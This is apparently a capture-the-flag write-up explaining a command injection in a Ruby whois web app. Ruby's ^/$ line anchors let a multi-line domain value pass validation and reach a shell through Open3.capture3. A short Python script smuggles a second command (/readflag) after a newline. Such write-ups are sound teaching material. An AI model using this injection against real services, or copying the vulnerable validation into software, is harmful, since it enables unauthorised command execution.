# Who Is He

## tldr
The application performs a `whois` lookup on a user-provided domain. However, the input validation uses Ruby's line anchors `^` and `$`, which only ensure that at least one line in the input matches the specified pattern. By providing a multi-line input, we can bypass this check and achieve command injection since the input is passed to a shell via `Open3.capture3`.

## Vulnerability
In `app.rb`:
```ruby
if @domain && @domain.match?(/^[a-z.-]+$/)
  stdout, stderr, status = Open3.capture3("whois #{@domain}")
```
The regex `/^[a-z.-]+$/` matches if any line in `@domain` consists only of lowercase letters, dots, or hyphens. A payload like `google.com\n/readflag ...` will pass this check because the first line is valid. The `Open3.capture3` call then executes the commands separated by the newline in a shell.

## Solution
We inject a newline followed by the execution of the `/readflag` SUID binary with the required passphrase.

### Solve Script
```python
import requests

url = "http://localhost:4567/lookup"
payload = {
    "domain": "google.com\n/readflag \"could you please give me the flag thank you so much\""
}

r = requests.post(url, data=payload)
print(r.text)
```